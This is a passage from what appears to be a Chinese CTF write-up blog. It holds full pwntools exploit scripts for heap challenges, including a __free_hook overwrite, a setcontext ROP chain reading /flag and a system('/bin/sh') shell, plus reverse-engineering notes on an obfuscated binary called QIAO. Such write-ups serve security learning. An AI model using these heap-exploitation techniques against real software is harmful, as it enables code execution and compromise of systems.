class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ec010</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;f&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">load(<span class="number">3</span>)</span><br><span class="line">load(<span class="number">4</span>)</span><br><span class="line">load(<span class="number">5</span>)</span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line">load(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.address+<span class="number">0x0000000000154930</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b free\nc&quot;)</span></span><br><span class="line"></span><br><span class="line">p_rdi=<span class="number">0x0000000000026b72</span>+libc.address</span><br><span class="line">p_rsi=<span class="number">0x0000000000027529</span>+libc.address</span><br><span class="line">p_rdx_r12=<span class="number">0x000000000011c371</span>+libc.address</span><br><span class="line">p_rax=<span class="number">0x000000000004a550</span>+libc.address</span><br><span class="line">syscall_ret=<span class="number">0x0000000000066229</span>+libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(heap_addr+<span class="number">0x6c0</span>)</span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>+p64(libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">8</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x6c0</span>+<span class="number">0xa8</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x6c0</span>+<span class="number">0xa8</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(p_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">add(<span class="number">0x180</span>,payload)</span><br><span class="line">load(<span class="number">12</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdi,heap_addr+<span class="number">0x6c0</span>,p_rdx_r12,<span class="number">0</span>,<span class="number">0</span>,p_rsi,<span class="number">0</span>,p_rax,<span class="number">2</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">3</span>,p_rdx_r12,<span class="number">0x100</span>,<span class="number">0</span>,p_rsi,heap_addr+<span class="number">0x2000</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">1</span>,p_rax,<span class="number">1</span>,syscall_ret</span><br><span class="line">]</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+flat(rop_chain))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="string">&quot;123.57.209.176&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h4><p>这道是ruan师傅做的，我赛后复现了一下</p><p>经典菜单题，洞在add里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);               <span class="comment">// %hd 表示为短整型2个字节</span></span><br><span class="line">  v2 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0x80</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid size.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( size &lt;= <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( size &gt; <span class="number">0x80</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = size;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  read_n((__int64)ptr, size);                 <span class="comment">// v2是第一次输入的sz</span></span><br><span class="line">  *((_BYTE *)ptr + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)&amp;unk_4060 + <span class="number">4</span> * i) = size;</span><br><span class="line">  heaplist[<span class="number">2</span> * i] = ptr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Finish.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，v2是第一次输入的size，如果这个size是不符合条件的，就能在执行<code>*((_BYTE *)ptr + v2 - 1) = 0;</code>时向上写入一个’\0’，可以用来改bin的fd，以构造overlop。</p><p>leak是先构造tecache_dup（即一个bin既在tecache，又在fastbin，利用的就是上面的思路）通过触发malloc_consoildate将fastbin放入unsoretdbin，从而leak main_arena。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xf0</span>+<span class="number">1</span>))</span><br><span class="line">add_(<span class="number">0x40</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">offset=<span class="number">0x1ebc20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure><p>之后还是上面的思路构造overlop。通过改fd的低字节为’\x00’使得chunk-&gt;fd指向的地址在chunk下面（距离小于chunk的size），导致overlop。</p><p>之后tecache attack打free_hook。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_</span>(<span class="params">sz,content</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host, port = <span class="number">1234</span></span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">if</span> host:</span><br><span class="line">        p = remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xf0</span>+<span class="number">1</span>))</span><br><span class="line">    add_(<span class="number">0x40</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,p64(<span class="number">0</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    offset=<span class="number">0x1ebc20</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-offset</span><br><span class="line">    success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xa0</span>+<span class="number">1</span>))</span><br><span class="line">    add_(<span class="number">0x60</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">    add(<span class="number">0x40</span>,payload)</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    dele(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h4 id="QIAO"><a href="#QIAO" class="headerlink" title="QIAO"></a>QIAO</h4><p>这题肝了好久，并不是它难，而是吃了逆向经验匮乏的亏。<br>首先这题花指令很多”jmp $+5”导致ida无法反编译，那就直接上手调了。<br>main函数开始先把一个大数放入stack里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [rbp-34h], 0B63C9FE1h</span><br></pre></td></tr></table></figure><p>之后通过调试会不断的将这个数和其他的数进行比较，相等的话就跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                                      mov     eax, [rbp-38h]</span><br><span class="line">.text:00000000004019FD                 sub     eax, 0B63C9FE1h</span><br><span class="line">.text:0000000000401A02                 mov     [rbp-50h], eax</span><br><span class="line">.text:0000000000401A05                 jz      loc_401ADB</span><br><span class="line">.text:0000000000401A0B                 jmp     $+5</span><br><span class="line"></span><br><span class="line">  loc_401ADB:                             ; CODE XREF: .text:0000000000401A05↑j</span><br><span class="line">.text:0000000000401ADB                 mov     eax, 501DC785h</span><br><span class="line">.text:0000000000401AE0                 mov     ecx, 44AF965Fh</span><br><span class="line">.text:0000000000401AE5                 mov     edx, [rbp-4]</span><br><span class="line">.text:0000000000401AE8                 cmp     edx, 2</span><br><span class="line">.text:0000000000401AEB                 cmovnz  eax, ecx</span><br><span class="line">.text:0000000000401AEE                 mov     [rbp-34h], eax</span><br><span class="line">.text:0000000000401AF1                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>这个跳转到loc_401ADB进行的是比较的操作，分析得是对argc的检查，如果为2就通过。</p><p>之后更新这个大数为501DC785h，并继续和其他数比较，相等的话就跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401A94                 mov     eax, [rbp-38h]</span><br><span class="line">.text:0000000000401A97                 sub     eax, 501DC785h</span><br><span class="line">.text:0000000000401A9C                 mov     [rbp-6Ch], eax</span><br><span class="line">.text:0000000000401A9F                 jz      loc_401B1D</span><br><span class="line">.text:0000000000401AA5                 jmp     $+5</span><br><span class="line"></span><br><span class="line">.text:0000000000401B1D loc_401B1D:                             ; CODE XREF: .text:0000000000401A9F↑j</span><br><span class="line">.text:0000000000401B1D                 mov     eax, 874FBE3Fh</span><br><span class="line">.text:0000000000401B22                 mov     ecx, 0B6DAB60Eh</span><br><span class="line">.text:0000000000401B27                 mov     rdx, [rbp-28h]</span><br><span class="line">.text:0000000000401B2B                 mov     rdi, [rdx+8]</span><br><span class="line">.text:0000000000401B2F                 mov     [rbp-7Ch], eax</span><br><span class="line">.text:0000000000401B32                 mov     [rbp-80h], ecx</span><br><span class="line">.text:0000000000401B35                 call    _strlen</span><br><span class="line">.text:0000000000401B3A                 cmp     rax, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0000000000401B3E                 mov     ecx, [rbp-7Ch]</span><br><span class="line">.text:0000000000401B41                 mov     esi, [rbp-80h]</span><br><span class="line">.text:0000000000401B44                 cmovnz  ecx, esi</span><br><span class="line">.text:0000000000401B47                 mov     [rbp-34h], ecx</span><br><span class="line">.text:0000000000401B4A                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>跳到loc_401B1D，call了strlen，完成的是对args的长度进行比较，为0x20即通过。</p><p>大数更新为874FBE3Fh，之后再比较跳到了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401B79 loc_401B79:                             ; CODE XREF: .text:0000000000401997↑j</span><br><span class="line">.text:0000000000401B79                 mov     eax, 8F7A1A66h</span><br><span class="line">.text:0000000000401B7E                 mov     ecx, 2D33904h</span><br><span class="line">.text:0000000000401B83                 mov     dword ptr [rbp-10h], 1BDh</span><br><span class="line">.text:0000000000401B8A                 mov     dword ptr [rbp-14h], 63h ; &#x27;c&#x27;</span><br><span class="line">.text:0000000000401B91                 mov     edx, [rbp-10h]</span><br><span class="line">.text:0000000000401B94                 mov     esi, [rbp-14h]</span><br><span class="line">.text:0000000000401B97                 imul    edx, edx</span><br><span class="line">.text:0000000000401B9A                 add     edx, 1</span><br><span class="line">.text:0000000000401B9D                 imul    esi, esi</span><br><span class="line">.text:0000000000401BA0                 imul    esi, 7</span><br><span class="line">.text:0000000000401BA3                 cmp     edx, esi</span><br><span class="line">.text:0000000000401BA5                 cmovz   eax, ecx</span><br><span class="line">.text:0000000000401BA8                 mov     [rbp-34h], eax</span><br><span class="line">.text:0000000000401BAB                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>感觉啥也没干，就更新了大数为8F7A1A66h，再跳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401C0C loc_401C0C:                             ; CODE XREF: .text:00000000004019C3↑j</span><br><span class="line">.text:0000000000401C0C                 mov     rax, [rbp-28h]</span><br><span class="line">.text:0000000000401C10                 mov     rdi, [rax+8]</span><br><span class="line">.text:0000000000401C14                 call    sub_401180</span><br><span class="line">.text:0000000000401C19                 mov     [rbp-30h], rax</span><br><span class="line">.text:0000000000401C1D                 mov     rdi, [rbp-30h]</span><br><span class="line">.text:0000000000401C21                 call    sub_4018C0</span><br><span class="line">.text:0000000000401C26                 mov     ecx, 0BC6F950Fh</span><br><span class="line">.text:0000000000401C2B                 mov     edx, 3B7E9E40h</span><br><span class="line">.text:0000000000401C30                 cmp     eax, 0</span><br><span class="line">.text:0000000000401C33                 cmovnz  ecx, edx</span><br><span class="line">.text:0000000000401C36                 mov     [rbp-34h], ecx</span><br><span class="line">.text:0000000000401C39                 jmp     loc_401DA7</span><br></pre></td></tr></table></figure><p>这个地方是关键部分。</p><p>一般这种要我们输入的逆向题会对我们的输入进行变形，然后进行比较，经分析发现sub_401180完成的就是对输入进行变形。</p><p>如我们输入’a’*0x20,内存中’a’占1个字节，而变形后’a’表是16进制的0xa，只占4bit，从而变形为长度为0x10的’aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa’(内存中)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x424290</span><br><span class="line">0x424290:0x00000000000000000x0000000000000021</span><br><span class="line">0x4242a0:0xaaaaaaaaaaaaaaaa0xaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>而sub_4018C0理论上应该是比较函数，而且分析发现函数的返回后eax会和1比较，为1就表示通过。但这个函数反编译后十分复杂，感觉不像人写的，所以我直接放放弃静态分析（实际上静态分析了好久分析了个寂寞）。</p><p>通过调试发现sub_4018C0执行完后会释放一个堆块，而且堆中多了好多奇怪的内容，并且和我们的输入没有关系。<br>于是我猜测就是和堆里的内容比较，于是在free下断得到堆里的数据为<code>7fa392e666d78abbb655165528fff33f</code>（经过大小端变换后的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x4242b0      //将要free的堆</span><br><span class="line">0x4242b0:0x00000000000000000x0000000000000021</span><br><span 